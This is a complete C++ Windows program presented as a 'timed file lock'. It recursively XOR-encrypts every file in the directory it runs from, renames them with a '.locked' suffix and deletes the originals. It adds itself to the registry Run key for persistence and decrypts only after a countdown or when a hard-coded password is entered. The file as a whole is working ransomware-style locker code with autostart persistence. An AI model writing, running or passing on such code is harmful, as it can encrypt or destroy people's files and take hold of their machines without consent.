#include <iostream>
#include <fstream>
#include <filesystem>
#include <chrono>
#include <thread>
#include <string>
#include <iomanip>
#include <windows.h>
#include <conio.h>

namespace fs = std::filesystem;

// ==========================================
// Embedded constants for the program
// ==========================================
const std::string ADMIN_PASSWORD = "admin123"; // the password to unlock the files during countdown
const std::string TARGET_PATH = "./"; // the directory to lock files in "./" means the current directory
const int LOCK_DURATION_SECONDS = 300;           // lock duration in seconds
const std::string CRYPTO_KEY = "Fast_XOR_Key_2026"; // the key used for XOR encryption/decryption
const char* REG_APP_KEY = "Software\\TimedFileLock"; // Registry key to store the end time of the lock
// ==========================================

// 1. Registry and autostart functions
void setAutostartAndTimer(long long targetEndTime) {
    // A) add to Windows startup registry
    HKEY hRunKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hRunKey) == ERROR_SUCCESS) {
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        RegSetValueExA(hRunKey, "TimedFileLockProgram", 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1);
        RegCloseKey(hRunKey);
    }

    // B) save the target end time in the registry for persistence
    HKEY hAppKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, REG_APP_KEY, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hAppKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hAppKey, "EndTime", 0, REG_QWORD, (const BYTE*)&targetEndTime, sizeof(targetEndTime));
        RegCloseKey(hAppKey);
    }
}

void cleanRegistrySettings() {
    // Process completed, remove both startup entry and end time data from the system
    HKEY hRunKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hRunKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hRunKey, "TimedFileLockProgram");
        RegCloseKey(hRunKey);
    }
    RegDeleteKeyA(HKEY_CURRENT_USER, REG_APP_KEY);
}

long long getSavedEndTime() {
    HKEY hKey;
    long long endTime = 0;
    DWORD dataSize = sizeof(endTime);
    if (RegOpenKeyExA(HKEY_CURRENT_USER, REG_APP_KEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "EndTime", NULL, NULL, (LPBYTE)&endTime, &dataSize);
        RegCloseKey(hKey);
    }
    return endTime;
}

// 2. encryption / decryption functions
void processSingleFile(const fs::path& filePath, bool encrypt) {
    std::ifstream inFile(filePath, std::ios::binary);
    if (!inFile) return;
    std::string data((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();

    for (size_t i = 0; i < data.size(); ++i) {
        data[i] ^= CRYPTO_KEY[i % CRYPTO_KEY.size()];
    }

    std::string newPathStr = encrypt ? filePath.string() + ".locked" : filePath.string().substr(0, filePath.string().length() - 7);
    
    std::ofstream outFile(newPathStr, std::ios::binary);
    if (outFile) {
        outFile.write(data.data(), data.size());
        outFile.close();
        fs::remove(filePath);
    }
}

void processFiles(bool encrypt) {
    if (!fs::exists(TARGET_PATH)) return;

    for (const auto& entry : fs::recursive_directory_iterator(TARGET_PATH)) {
        if (entry.is_regular_file()) {
            std::string pathStr = entry.path().string();
            if (encrypt && pathStr.length() >= 7 && pathStr.substr(pathStr.length() - 7) == ".locked") continue;
            if (!encrypt && (pathStr.length() < 7 || pathStr.substr(pathStr.length() - 7) != ".locked")) continue;
            
            processSingleFile(entry.path(), encrypt);
        }
    }
}

// 3. main function
int main() {
    std::cout << "--- Timed File Lock System ---\n";
    
    // Get the current time and the saved end time from the registry
    long long now = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count();
    long long endTime = getSavedEndTime();

    // If there is no saved end time, set it to now + LOCK_DURATION_SECONDS and save it in the registry
    if (endTime == 0) {
        endTime = now + LOCK_DURATION_SECONDS;
        setAutostartAndTimer(endTime);
        processFiles(true); // encrypt files
        std::cout << "Files locked and system integrated with startup!\n\n";
    } else {
        std::cout << "previous lock session detected, resuming from where it left off...\n\n";
    }

    int remaining = static_cast<int>(endTime - now);
    if (remaining < 0) remaining = 0;

    std::string inputBuffer = "";
    std::string statusMsg = "";
    bool isUnlocked = false;

    // countdown loop
    while (remaining > 0 && !isUnlocked) {
        if (_kbhit()) {
            char ch = _getch();
            if (ch == '\n' || ch == '\r') {
                if (inputBuffer == ADMIN_PASSWORD) {
                    isUnlocked = true;
                    break;
                } else {
                    statusMsg = " [!] Incorrect password!";
                    inputBuffer.clear();
                }
            } else if (ch == 127 || ch == '\b') {
                if (!inputBuffer.empty()) inputBuffer.pop_back();
            } else if (ch >= 32 && ch <= 126) {
                inputBuffer += ch;
                statusMsg = "";
            }
        }

        // compute remaining time
        now = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count();
        remaining = static_cast<int>(endTime - now);
        if (remaining < 0) remaining = 0;

        int mins = remaining / 60;
        int secs = remaining % 60;
        
        // print the countdown and input status
        std::cout << "\r\033[K" << "Remaining time: " << std::setfill('0') << std::setw(2) << mins << ":" 
                  << std::setfill('0') << std::setw(2) << secs 
                  << " | Password: " << std::string(inputBuffer.length(), '*') << statusMsg << std::flush;

        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }

    // unlock and clean
    std::cout << "\n\nUNLOCKING...\n";
    processFiles(false); // decrypt the files
    cleanRegistrySettings(); // clean the auto-start and time data has left
    std::cout << "All files decrypted and system cleaned!\n";

    std::this_thread::sleep_for(std::chrono::seconds(3));
    return 0;
}